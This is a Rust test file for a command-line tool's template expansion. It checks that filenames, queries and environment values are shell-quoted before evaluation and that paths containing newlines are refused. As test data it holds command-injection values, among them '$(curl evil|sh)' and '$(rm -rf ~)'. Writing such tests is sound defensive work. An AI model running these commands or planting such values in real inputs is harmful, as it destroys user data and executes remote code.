//! The template grammar and the two shell seams.

use std::collections::HashMap;
use std::fs;
use std::path::PathBuf;

use scout::actions::template::{posix_single_quote, ExpandCtx, ExpandError};

use crate::{t, temp_dir};

#[test]
fn the_print_seam_quotes_paths_and_refuses_hazardous_ones() {
    let env = HashMap::new();
    let path = PathBuf::from("/tmp/it's a dir");
    let ctx = ExpandCtx { path: &path, query: "q", home: "/home/u", env: &env };

    let quoted = t("cd {path}").expand(&ctx, true).unwrap();
    assert_eq!(quoted, "cd '/tmp/it'\\''s a dir'");

    // The argv seam does not quote: execvp gets the literal bytes.
    let unquoted = t("{path}").expand(&ctx, false).unwrap();
    assert_eq!(unquoted, "/tmp/it's a dir");

    let evil = PathBuf::from("/tmp/evil\nname");
    let ctx = ExpandCtx { path: &evil, query: "", home: "/home/u", env: &env };
    assert_eq!(t("{path}").expand(&ctx, true).unwrap_err(), ExpandError::HazardousPath);
}

/// An attacker-influenced filename, query or env value must not reach
/// the wrapper's eval unquoted.
#[test]
fn the_print_seam_quotes_every_placeholder_not_just_paths() {
    let mut env = HashMap::new();
    env.insert("EVIL".to_string(), "$(rm -rf ~)".to_string());
    let path = PathBuf::from("/tmp/$(curl evil|sh)");
    let ctx = ExpandCtx { path: &path, query: "`whoami`", home: "/home/u", env: &env };

    // {name}: a basename can hold shell metacharacters.
    assert_eq!(t("echo {name}").expand(&ctx, true).unwrap(), "echo '$(curl evil|sh)'");
    // {query}: literally user-typed.
    assert_eq!(t("grep {query}").expand(&ctx, true).unwrap(), "grep '`whoami`'");
    // {env.*}: data, never a command at this seam.
    assert_eq!(t("run {env.EVIL}").expand(&ctx, true).unwrap(), "run '$(rm -rf ~)'");

    // A newline in a non-path placeholder is equally hazardous.
    let mut env2 = HashMap::new();
    env2.insert("NL".to_string(), "a\nb".to_string());
    let ctx2 = ExpandCtx { path: &path, query: "", home: "/h", env: &env2 };
    assert_eq!(t("x {env.NL}").expand(&ctx2, true).unwrap_err(), ExpandError::HazardousPath);
}

#[test]
fn an_empty_query_is_valid_but_a_missing_env_binding_is_not() {
    let env = HashMap::new();
    let path = PathBuf::from("/tmp");
    let ctx = ExpandCtx { path: &path, query: "", home: "/h", env: &env };
    assert_eq!(t("q={query}").expand(&ctx, false).unwrap(), "q=");
    assert!(matches!(t("{env.NOPE}").expand(&ctx, false), Err(ExpandError::UndefinedEnv(_))));
}

#[test]
fn repo_root_resolves_through_a_git_file_or_directory_and_is_undefined_otherwise() {
    let dir = temp_dir("reporoot");
    let repo = dir.join("repo");
    let nested = repo.join("a/b");
    fs::create_dir_all(&nested).unwrap();
    fs::create_dir(repo.join(".git")).unwrap();

    let env = HashMap::new();
    let ctx = ExpandCtx { path: &nested, query: "", home: "/h", env: &env };
    assert_eq!(t("{repo_root}").expand(&ctx, false).unwrap(), repo.display().to_string());

    // A worktree-style `.git` FILE also counts.
    let wt = dir.join("worktree");
    fs::create_dir_all(&wt).unwrap();
    fs::write(wt.join(".git"), "gitdir: elsewhere\n").unwrap();
    let ctx = ExpandCtx { path: &wt, query: "", home: "/h", env: &env };
    assert_eq!(t("{repo_root}").expand(&ctx, false).unwrap(), wt.display().to_string());

    // No `.git` anywhere under the temp root: undefined.
    let bare = temp_dir("bare");
    let ctx = ExpandCtx { path: &bare, query: "", home: "/h", env: &env };
    assert!(matches!(
        t("{repo_root}").expand(&ctx, false),
        Err(ExpandError::UndefinedPlaceholder(_))
    ));

    fs::remove_dir_all(&dir).unwrap();
    fs::remove_dir_all(&bare).unwrap();
}

#[test]
fn braces_escape_and_quoting_is_posix() {
    // {{ }} escapes to literal braces.
    let tpl = t("a {{literal}} b");
    assert!(!tpl.has_placeholder());

    assert_eq!(posix_single_quote("/plain/path"), "'/plain/path'");
    assert_eq!(posix_single_quote("/it's here"), "'/it'\\''s here'");
}
